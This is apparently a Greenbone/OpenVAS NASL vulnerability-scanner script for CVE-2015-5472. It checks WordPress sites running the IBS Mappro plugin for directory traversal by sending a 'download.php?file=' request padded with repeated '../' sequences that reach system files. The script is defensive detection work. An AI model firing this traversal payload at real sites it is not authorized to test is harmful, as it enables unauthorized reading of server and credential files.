# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808201");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2015-5472");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2016-05-20 16:09:30 +0530 (Fri, 20 May 2016)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("WordPress IBS Mappro Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"The WordPress plugin 'IBS Mappro' is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not");

  script_tag(name:"insight", value:"The flaw exists due to an improper sanitization
  of input to 'file' parameter in 'lib/download.php' file.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers
  to read arbitrary files.");

  script_tag(name:"affected", value:"WordPress IBS Mappro version 0.6 and previous");

  script_tag(name:"solution", value:"Update to IBS Mappro version 1.0 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://wpvulndb.com/vulnerabilities/8091");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/ibs-mappro");
  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + '/wp-content/plugins/ibs-mappro/lib/download.php?file=' + crap(data: "../", length: 3*15) + files[file];
  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
